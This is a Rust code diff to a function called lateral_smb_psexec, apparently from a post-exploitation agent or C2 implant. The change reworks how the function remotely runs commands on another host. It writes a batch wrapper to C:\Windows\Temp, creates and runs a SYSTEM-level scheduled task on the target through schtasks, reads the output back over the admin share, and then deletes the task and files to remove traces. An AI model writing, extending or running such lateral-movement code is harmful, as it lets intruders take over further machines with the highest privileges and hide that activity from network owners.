@@ -82,28 +82,49 @@ fn lateral_smb_psexec(v: &serde_json::Value) -> TaskOutput {
     }
     unsafe { fn_close(scm) };
 
-    // Use schtasks for execution (avoids service-protocol requirement)
-    let tr = format!("cmd /c {cmd} > {rem_out} 2>&1");
-    let create = shell_run(&format!(
-        "schtasks /Create /S {host} /RU SYSTEM /TN {task_nm} /TR \"{tr}\" /SC ONCE /ST 00:00 /F"
-    ));
-    if create.is_err() { return TaskOutput::failure(&format!("smb-psexec: schtasks create failed: {}", create.unwrap_err())); }
+    // Write a batch wrapper so the > redirect is not re-interpreted by the outer cmd /C
+    let bat_path = format!("C:\\Windows\\Temp\\~dmlat{id}.bat");
+    let bat = format!("@echo off\r\n{cmd} > \"{rem_out}\" 2>&1\r\n");
+    if std::fs::write(&bat_path, bat.as_bytes()).is_err() {
+        return TaskOutput::failure("smb-psexec: failed to write bat wrapper");
+    }
 
-    let _ = shell_run(&format!("schtasks /Run /S {host} /TN {task_nm}"));
+    let is_local = host == "127.0.0.1" || host.eq_ignore_ascii_case("localhost");
+    let (create_cmd, run_cmd, del_cmd) = if is_local {
+        (
+            format!("schtasks /Create /RU SYSTEM /TN {task_nm} /TR \"{bat_path}\" /SC ONCE /ST 00:00 /F"),
+            format!("schtasks /Run /TN {task_nm}"),
+            format!("schtasks /Delete /TN {task_nm} /F"),
+        )
+    } else {
+        (
+            format!("schtasks /Create /S {host} /RU SYSTEM /TN {task_nm} /TR \"{bat_path}\" /SC ONCE /ST 00:00 /F"),
+            format!("schtasks /Run /S {host} /TN {task_nm}"),
+            format!("schtasks /Delete /S {host} /TN {task_nm} /F"),
+        )
+    };
+    let create = shell_run(&create_cmd);
+    if create.is_err() {
+        let _ = std::fs::remove_file(&bat_path);
+        return TaskOutput::failure(&format!("smb-psexec: schtasks create failed: {}", create.unwrap_err()));
+    }
 
-    // Poll for output file via admin$
+    let _ = shell_run(&run_cmd);
+
+    let poll_path = if is_local { &rem_out } else { &unc_out };
     let mut output = Vec::new();
     let deadline = std::time::Instant::now() + std::time::Duration::from_secs(timeout);
     loop {
         std::thread::sleep(std::time::Duration::from_millis(500));
-        if let Ok(data) = std::fs::read(&unc_out) {
+        if let Ok(data) = std::fs::read(poll_path) {
             output = data;
-            let _ = std::fs::remove_file(&unc_out);
+            let _ = std::fs::remove_file(poll_path);
             break;
         }
         if std::time::Instant::now() >= deadline { break; }
     }
-    let _ = shell_run(&format!("schtasks /Delete /S {host} /TN {task_nm} /F"));
+    let _ = shell_run(&del_cmd);
+    let _ = std::fs::remove_file(&bat_path);
 
     if output.is_empty() {
         TaskOutput::failure(&format!("smb-psexec: no output from {host} within {timeout}s"))
